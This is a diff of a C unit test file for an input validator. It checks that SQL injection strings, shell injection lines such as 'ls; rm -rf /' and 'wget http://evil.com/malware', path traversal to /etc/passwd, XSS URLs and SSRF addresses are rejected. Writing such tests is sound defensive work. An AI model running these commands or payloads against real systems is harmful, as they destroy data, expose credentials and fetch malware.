@@ -1,5 +1,6 @@
 // SPDX-FileCopyrightText: 2025-2026 SPHARX Ltd.
 // SPDX-License-Identifier: AGPL-3.0-or-later OR Apache-2.0
+
 /**
  * @file test_input_validator.c
  * @brief 输入验证器模块单元测试
@@ -11,7 +12,6 @@
  * - 命令注入检测
  * - 缓冲区溢出保护
  *
- * @copyright Copyright (c) 2026 SPHARX. All Rights Reserved.
  */
 
 #include "../../utils/security/src/input_validator.h"
@@ -30,21 +30,17 @@ static void test_validate_string_length(void **state)
 {
     airy_validation_result_t result;
 
-    // 测试有效长度
     airy_validate_string_length("valid", 1, 10, &result);
     AIRY_TEST_ASSERT_SUCCESS(result.is_valid);
 
-    // 测试长度过短
     airy_validate_string_length("a", 5, 10, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
     AIRY_TEST_ASSERT_INT_EQUAL(AIRY_EINVAL, result.error_code);
 
-    // 测试长度过长
     airy_validate_string_length("this is a very long string", 1, 10, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
     AIRY_TEST_ASSERT_INT_EQUAL(AIRY_EINVAL, result.error_code);
 
-    // 测试NULL输入
     airy_validate_string_length(NULL, 1, 10, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
     AIRY_TEST_ASSERT_INT_EQUAL(AIRY_EINVAL, result.error_code);
@@ -57,18 +53,14 @@ static void test_validate_identifier(void **state)
 {
     airy_validation_result_t result;
 
-    // 测试有效标识符
     airy_validate_identifier("valid_identifier_123", 30, &result);
     AIRY_TEST_ASSERT_SUCCESS(result.is_valid);
 
-    // 测试包含特殊字符
     airy_validate_identifier("invalid@identifier", 30, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
     AIRY_TEST_ASSERT_INT_EQUAL(AIRY_ESANITIZE, result.error_code);
 
-    // 测试超长标识符
-    airy_validate_identifier("this_is_a_very_long_identifier_name_that_exceeds_limit", 30,
-                                &result);
+    airy_validate_identifier("this_is_a_very_long_identifier_name_that_exceeds_limit", 30, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
     AIRY_TEST_ASSERT_INT_EQUAL(AIRY_EINVAL, result.error_code);
 }
@@ -80,27 +72,21 @@ static void test_validate_sql_query(void **state)
 {
     airy_validation_result_t result;
 
-    // 测试正常SQL
     airy_validate_sql_query("SELECT * FROM users WHERE id = 1", &result);
     AIRY_TEST_ASSERT_SUCCESS(result.is_valid);
 
-    // 测试SQL注入 - UNION攻击
     airy_validate_sql_query("SELECT * FROM users UNION SELECT * FROM passwords", &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 
-    // 测试SQL注入 - OR 1=1
     airy_validate_sql_query("SELECT * FROM users WHERE id = 1 OR 1=1", &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 
-    // 测试SQL注入 - 注释攻击
     airy_validate_sql_query("SELECT * FROM users WHERE id = 1; --", &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 
-    // 测试危险操作 - DROP
     airy_validate_sql_query("DROP TABLE users", &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 
-    // 测试危险操作 - TRUNCATE
     airy_validate_sql_query("TRUNCATE TABLE users", &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 }
@@ -113,7 +99,6 @@ static void test_sanitize_sql_identifier(void **state)
     char *sanitized = NULL;
     airy_err_t err;
 
-    // 测试有效标识符
     err = airy_sanitize_sql_identifier("valid_table", &sanitized);
     AIRY_TEST_ASSERT_SUCCESS(err);
     AIRY_TEST_ASSERT_PTR_NOT_NULL(sanitized);
@@ -122,11 +107,9 @@ static void test_sanitize_sql_identifier(void **state)
         free(sanitized);
     sanitized = NULL;
 
-    // 测试包含特殊字符的标识符
     err = airy_sanitize_sql_identifier("table; DROP TABLE users--", &sanitized);
     AIRY_TEST_ASSERT_SUCCESS(err);
     AIRY_TEST_ASSERT_PTR_NOT_NULL(sanitized);
-    // 特殊字符应该被转义或移除
     AIRY_TEST_ASSERT_FALSE(strstr(sanitized, ";") != NULL);
     if (sanitized)
         free(sanitized);
@@ -140,23 +123,18 @@ static void test_validate_shell_command(void **state)
     airy_validation_result_t result;
     const char *allowed_commands[] = {"ls", "cat", "echo", NULL};
 
-    // 测试允许的命令
     airy_validate_shell_command("ls -la", allowed_commands, &result);
     AIRY_TEST_ASSERT_SUCCESS(result.is_valid);
 
-    // 测试命令注入 - 分号
     airy_validate_shell_command("ls; rm -rf /", allowed_commands, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 
-    // 测试命令注入 - 管道
     airy_validate_shell_command("ls | cat /etc/passwd", allowed_commands, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 
-    // 测试危险命令
     airy_validate_shell_command("rm -rf /", allowed_commands, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 
-    // 测试未授权的命令
     airy_validate_shell_command("wget http://evil.com/malware", allowed_commands, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 }
@@ -177,11 +155,9 @@ static void test_sanitize_shell_param(void **state)
         free(sanitized);
     sanitized = NULL;
 
-    // 测试危险参数 - 命令注入
     err = airy_sanitize_shell_param("filename; rm -rf /", &sanitized);
     AIRY_TEST_ASSERT_SUCCESS(err);
     AIRY_TEST_ASSERT_PTR_NOT_NULL(sanitized);
-    // 特殊字符应该被转义
     if (sanitized)
         free(sanitized);
 }
@@ -193,23 +169,18 @@ static void test_validate_file_path(void **state)
 {
     airy_validation_result_t result;
 
-    // 测试有效路径
     airy_validate_file_path("/home/user/file.txt", NULL, &result);
     AIRY_TEST_ASSERT_SUCCESS(result.is_valid);
 
-    // 测试路径遍历 - ../
     airy_validate_file_path("../../../etc/passwd", NULL, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 
-    // 测试路径遍历 - ..\
     airy_validate_file_path("..\\..\\..\\windows\\system32", NULL, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 
-    // 测试空字节注入
     airy_validate_file_path("/home/user/file.txt\0.jpg", NULL, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 
-    // 测试符号链接攻击（如果支持）
     airy_validate_file_path("/tmp/../../etc/passwd", NULL, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 }
@@ -222,27 +193,21 @@ static void test_validate_url(void **state)
     airy_validation_result_t result;
     const char *allowed_schemes[] = {"http", "https", NULL};
 
-    // 测试有效URL
     airy_validate_url("https://www.example.com/path?query=value", allowed_schemes, &result);
     AIRY_TEST_ASSERT_SUCCESS(result.is_valid);
 
-    // 测试危险协议 - javascript
     airy_validate_url("javascript:alert('XSS')", allowed_schemes, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 
-    // 测试危险协议 - data
     airy_validate_url("data:text/html,<script>alert('XSS')</script>", allowed_schemes, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 
-    // 测试SSRF - localhost
     airy_validate_url("http://localhost:8080/admin", allowed_schemes, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 
-    // 测试SSRF - 内网IP
     airy_validate_url("http://192.168.1.1/admin", allowed_schemes, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 
-    // 测试SSRF - 10.x.x.x
     airy_validate_url("http://10.0.0.1/internal", allowed_schemes, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 }
@@ -257,7 +222,7 @@ static void test_parse_url(void **state)
     airy_err_t err;
 
     err = airy_parse_url("https://www.example.com:8080/path/to/resource", &scheme, &host, &port,
-                            &path);
+                         &path);
     AIRY_TEST_ASSERT_SUCCESS(err);
     AIRY_TEST_ASSERT_PTR_NOT_NULL(scheme);
     AIRY_TEST_ASSERT_PTR_NOT_NULL(host);
@@ -281,15 +246,12 @@ static void test_validate_int_range(void **state)
 {
     airy_validation_result_t result;
 
-    // 测试有效范围
     airy_validate_int_range(50, 0, 100, &result);
     AIRY_TEST_ASSERT_SUCCESS(result.is_valid);
 
-    // 测试超出范围（太小）
     airy_validate_int_range(-10, 0, 100, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 
-    // 测试超出范围（太大）
     airy_validate_int_range(200, 0, 100, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 }
@@ -301,11 +263,9 @@ static void test_validate_float_range(void **state)
 {
     airy_validation_result_t result;
 
-    // 测试有效范围
     airy_validate_float_range(3.14, 0.0, 10.0, &result);
     AIRY_TEST_ASSERT_SUCCESS(result.is_valid);
 
-    // 测试超出范围
     airy_validate_float_range(-5.5, 0.0, 10.0, &result);
     AIRY_TEST_ASSERT_FALSE(result.is_valid);
 }
@@ -319,7 +279,6 @@ static void test_safe_memcpy(void **state)
     const char *src = "Hello, World!";
     airy_err_t err;
 
-    // 测试正常复制
     err = airy_safe_memcpy(dest, sizeof(dest), src, strlen(src) + 1);
     AIRY_TEST_ASSERT_SUCCESS(err);
     AIRY_TEST_ASSERT_STRING_EQUAL(src, dest);
@@ -337,12 +296,10 @@ static void test_safe_strcpy(void **state)
     char dest[10];
     airy_err_t err;
 
-    // 测试正常复制
     err = airy_safe_strcpy(dest, sizeof(dest), "short");
     AIRY_TEST_ASSERT_SUCCESS(err);
     AIRY_TEST_ASSERT_STRING_EQUAL("short", dest);
 
-    // 测试截断
     err = airy_safe_strcpy(dest, sizeof(dest), "this is a very long string");
     AIRY_TEST_ASSERT_FALSE(err == AIRY_OK);
 }
@@ -355,7 +312,6 @@ static void test_safe_strcat(void **state)
     char dest[20] = "Hello";
     airy_err_t err;
 
-    // 测试正常拼接
     err = airy_safe_strcat(dest, sizeof(dest), ", World!");
     AIRY_TEST_ASSERT_SUCCESS(err);
     AIRY_TEST_ASSERT_STRING_EQUAL("Hello, World!", dest);
@@ -373,12 +329,9 @@ static void test_validation_macros(void **state)
     airy_validation_result_t result;
     airy_err_t err = AIRY_OK;
 
-    // 测试AIRY_VALIDATE_OR_RETURN
     airy_validate_string_length("valid", 1, 10, &result);
-    // 不应该返回
     AIRY_TEST_ASSERT_TRUE(result.is_valid);
 
-    // 测试AIRY_SAFE_STRCPY
     char dest[20];
     err = AIRY_SAFE_STRCPY(dest, "test");
     AIRY_TEST_ASSERT_SUCCESS(err);
